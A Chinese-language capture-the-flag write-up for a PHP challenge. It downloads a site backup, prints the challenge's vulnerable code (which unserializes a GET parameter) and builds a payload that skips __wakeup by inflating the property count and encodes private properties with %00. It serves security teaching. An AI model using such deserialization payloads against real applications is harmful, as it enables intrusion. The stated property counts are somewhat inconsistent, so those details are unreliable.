---
title: PHP
tags: PHP
description: buu PHPwp
---
# BUU-PHP
## 爆破目录下载源码
查看网址，通过备份网站的线索可以想到是可以通过爆破目录下载源码的，我们直接尝试www.zip，获得源码。
![](./img/Snipaste_2024-01-05_23-28-10.png)
## 代码审计
源码，我们获得了flag.php，经过尝试是一个假flag，于是接着进行代码审计。

```php
#index.php
<!DOCTYPE html>
<head>
  <meta charset="UTF-8">
  <title>I have a cat!</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css">
      <link rel="stylesheet" href="style.css">
</head>
<style>
    #login{   
        position: absolute;   
        top: 50%;   
        left:50%;   
        margin: -150px 0 0 -150px;   
        width: 300px;   
        height: 300px;   
    }   
    h4{   
        font-size: 2em;   
        margin: 0.67em 0;   
    }
</style>
<body>
<div id="world">
    <div style="text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 85%;left: 440px;font-family:KaiTi;">因为每次猫猫都在我键盘上乱跳，所以我有一个良好的备份网站的习惯
    </div>
    <div style="text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 80%;left: 700px;font-family:KaiTi;">不愧是我！！！
    </div>
    <div style="text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 70%;left: 640px;font-family:KaiTi;">
    <?php
    include 'class.php';
    $select = $_GET['select'];
    $res=unserialize(@$select);
    ?>
    </div>
    <div style="position: absolute;bottom: 5%;width: 99%;"><p align="center" style="font:italic 15px Georgia,serif;color:white;"> Syclover @ cl4y</p></div>
</div>
<script src='http://cdnjs.cloudflare.com/ajax/libs/three.js/r70/three.min.js'></script>
<script src='http://cdnjs.cloudflare.com/ajax/libs/gsap/1.16.1/TweenMax.min.js'></script>
<script src='https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/OrbitControls.js'></script>
<script src='https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/Cat.js'></script>
<script  src="index.js"></script>
</body>
</html>

```
```php
#class.php
<?php
include 'flag.php';


error_reporting(0);


class Name{
    private $username = 'nonono';
    private $password = 'yesyes';

    public function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }

    function __wakeup(){
        $this->username = 'guest';
    }

    function __destruct(){
        if ($this->password != 100) {
            echo "</br>NO!!!hacker!!!</br>";
            echo "You name is: ";
            echo $this->username;echo "</br>";
            echo "You password is: ";
            echo $this->password;echo "</br>";
            die();
        }
        if ($this->username === 'admin') {
            global $flag;
            echo $flag;
        }else{
            echo "</br>hello my friend~~</br>sorry i can't give you the flag!";
            die();

            
        }
    }
}
?>
```
我们可以看到index.php中要求我们用`get`请求传入一个`select`参数并将其反序列化。

在`class.php`中我们可以看到得到flag的方法是将`usename`赋值为`admin`，将`password`赋值为`100`。
![](./img/Snipaste_2024-01-06_00-01-54.png)
### 绕过`__wakeup`魔术方法
由于`__wakeup`函数会在一个 class 被反序列化完成后调用，而根据代码逻辑，在`__wakeup`函数里会修改`username`为`guest`，因此思考如何跳过`wakeup`魔术方法：
`_wakeup()函数漏洞原理：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。`
我们将
```
O:4:"Name":2:{s:14:" Name username";s:5:"admin";s:14:" Name password";i:100;}
```
改成
```
O:4:"Name":3:{s:14:" Name username";s:5:"admin";s:14:" Name password";i:100;}
```
#### 私有变量
解决了绕过魔术方法是之后，我们还发现usename和password是私有变量。PHP 反序列化时私有变量的格式是 s:12:"\0类名\0变量名"，其中 \0 是不可见字符，表示 ASCII 码为 0 的字符。当用 get 传参时，URL 中不能包含不可见字符，否则会被忽略或者导致错误。因此，私有变量需要将\0改成 %00 来表示不可见字符，即经过 URL Encode，例如 s:12:"%00类名%00变量名"。
传入Payload:
```
O:4:"Name":4:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}
```